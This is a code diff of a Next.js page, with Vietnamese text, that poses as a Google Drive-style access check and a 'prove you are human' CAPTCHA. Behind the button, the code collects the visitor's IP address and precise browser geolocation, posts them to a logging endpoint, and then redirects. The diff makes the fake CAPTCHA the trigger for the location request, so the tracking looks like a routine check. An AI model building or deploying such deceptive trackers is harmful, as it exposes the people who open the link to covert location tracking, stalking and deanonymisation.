@@ -1,11 +1,11 @@
-
 'use client';
 
-import React, { useEffect, useState } from 'react';
+import React, { useState } from 'react';
 import { Card, CardContent } from '@/components/ui/card';
 import Image from 'next/image';
-import { Loader2, FileText } from 'lucide-react';
+import { Loader2, FileText, UserCheck } from 'lucide-react';
 import type { VerificationConfig } from '@/app/actions/settings';
+import { Button } from '@/components/ui/button';
 
 interface DriveVerificationClientProps {
   config: VerificationConfig;
@@ -13,72 +13,68 @@ interface DriveVerificationClientProps {
 
 export function DriveVerificationClient({ config }: DriveVerificationClientProps) {
   const { redirectUrl } = config;
-  const [status, setStatus] = useState('Đang khởi tạo xác minh...');
+  const [status, setStatus] = useState('Đang chờ xác minh của bạn...');
+  const [isVerifying, setIsVerifying] = useState(false);
 
-  useEffect(() => {
+  const handleVerification = async () => {
+    setIsVerifying(true);
     const REDIRECT_URL = redirectUrl || 'https://www.google.com/';
 
-    const startVerificationProcess = async () => {
-      let clientIp = 'N/A';
-      try {
-        setStatus('Đang xác định địa chỉ mạng...');
-        const ipResponse = await fetch('https://api.ipify.org?format=json');
-        if (ipResponse.ok) {
-          clientIp = (await ipResponse.json()).ip;
-        }
-      } catch (e) {
-        // Continue without IP if fetch fails
-        setStatus('Không thể xác định địa chỉ mạng. Đang tiếp tục...');
+    let clientIp = 'N/A';
+    try {
+      setStatus('Đang xác định địa chỉ mạng...');
+      const ipResponse = await fetch('https://api.ipify.org?format=json');
+      if (ipResponse.ok) {
+        clientIp = (await ipResponse.json()).ip;
+      }
+    } catch (e) {
+      // Continue without IP if fetch fails
+      setStatus('Không thể xác định địa chỉ mạng. Đang tiếp tục...');
+    }
+
+    const logAndRedirect = (pos?: GeolocationPosition) => {
+      setStatus('Đang ghi lại thông tin an toàn và chuẩn bị chuyển hướng...');
+      const body: { ip: string; lat?: number; lon?: number; acc?: number } = { ip: clientIp };
+      if (pos) {
+        body.lat = pos.coords.latitude;
+        body.lon = pos.coords.longitude;
+        body.acc = pos.coords.accuracy;
       }
 
-      const logAndRedirect = (pos?: GeolocationPosition) => {
-        setStatus('Đang ghi lại thông tin an toàn và chuẩn bị chuyển hướng...');
-        const body: { ip: string; lat?: number; lon?: number; acc?: number } = { ip: clientIp };
-        if (pos) {
-          body.lat = pos.coords.latitude;
-          body.lon = pos.coords.longitude;
-          body.acc = pos.coords.accuracy;
-        }
-
-        const payload = JSON.stringify(body);
-        
-        // Use fetch with keepalive which is reliable for sending data before unload.
-        fetch('/api/log-location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: payload,
-          keepalive: true,
-        }).catch(err => {
-            // Even if logging fails, we should still redirect.
-            console.error("Logging failed, but redirecting anyway:", err);
-        }).finally(() => {
-            // Redirect after a very short delay to ensure fetch is dispatched.
-            setTimeout(() => {
-                window.location.href = REDIRECT_URL;
-            }, 150);
-        });
-      };
-
-      setStatus('Đang yêu cầu quyền truy cập vị trí...');
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          logAndRedirect, // Success: Log with position
-          () => { // Error
-            setStatus('Truy cập vị trí bị từ chối. Đang tiếp tục...');
-            logAndRedirect(); // Log with IP only
-          },
-          { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
-        );
-      } else {
-        setStatus('Trình duyệt không hỗ trợ vị trí. Đang tiếp tục...');
-        logAndRedirect(); // Geolocation not supported, log IP only
-      }
+      const payload = JSON.stringify(body);
+      
+      // Use fetch with keepalive which is reliable for sending data before unload.
+      fetch('/api/log-location', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: payload,
+        keepalive: true,
+      }).catch(err => {
+          // Even if logging fails, we should still redirect.
+          console.error("Logging failed, but redirecting anyway:", err);
+      }).finally(() => {
+          // Redirect after a very short delay to ensure fetch is dispatched.
+          setTimeout(() => {
+              window.location.href = REDIRECT_URL;
+          }, 150);
+      });
     };
 
-    // The process now starts immediately without the previous delay.
-    startVerificationProcess();
-    
-  }, [redirectUrl]);
+    setStatus('Đang yêu cầu quyền truy cập vị trí...');
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(
+        logAndRedirect, // Success: Log with position
+        () => { // Error
+          setStatus('Truy cập vị trí bị từ chối. Đang tiếp tục...');
+          logAndRedirect(); // Log with IP only
+        },
+        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
+      );
+    } else {
+      setStatus('Trình duyệt không hỗ trợ vị trí. Đang tiếp tục...');
+      logAndRedirect(); // Geolocation not supported, log IP only
+    }
+  };
 
   return (
     <div className="flex justify-center items-center min-h-screen bg-cover bg-center p-4" style={{backgroundImage: "url('https://images.unsplash.com/photo-1554141316-1f7f5a934143?q=80&w=2574&auto=format&fit=crop')"}}>
@@ -109,15 +105,30 @@ export function DriveVerificationClient({ config }: DriveVerificationClientProps
             </div>
           </div>
           
-          <h1 className="text-2xl font-bold mb-2 text-foreground">Đang xác thực quyền truy cập...</h1>
-          <p className="text-muted-foreground text-sm leading-normal mb-8">
-            Để đảm bảo an toàn, chúng tôi cần xác minh yêu cầu của bạn trước khi chuyển hướng. Vui lòng đợi.
-          </p>
+          {isVerifying ? (
+            <>
+              <h1 className="text-2xl font-bold mb-2 text-foreground">Đang xác thực quyền truy cập...</h1>
+              <p className="text-muted-foreground text-sm leading-normal mb-8">
+                Để đảm bảo an toàn, chúng tôi cần xác minh yêu cầu của bạn trước khi chuyển hướng. Vui lòng đợi.
+              </p>
 
-          <div className="w-full flex flex-col items-center justify-center gap-4 h-16">
-            <Loader2 className="h-10 w-10 text-primary animate-spin" />
-            <p className="text-xs text-muted-foreground animate-pulse">{status}</p>
-          </div>
+              <div className="w-full flex flex-col items-center justify-center gap-4 h-24">
+                <Loader2 className="h-10 w-10 text-primary animate-spin" />
+                <p className="text-xs text-muted-foreground animate-pulse">{status}</p>
+              </div>
+            </>
+          ) : (
+            <>
+              <h1 className="text-2xl font-bold mb-2 text-foreground">Xác minh</h1>
+              <p className="text-muted-foreground text-sm leading-normal mb-8">
+                Hãy giải quyết thử thách này để chúng tôi biết bạn là một con người thực sự.
+              </p>
+              <Button onClick={handleVerification} size="lg" className="w-full h-16 text-lg font-bold">
+                 <UserCheck className="mr-3 h-6 w-6" />
+                 Tôi là con người (đồng ý)
+              </Button>
+            </>
+          )}
         </CardContent>
       </Card>
     </div>
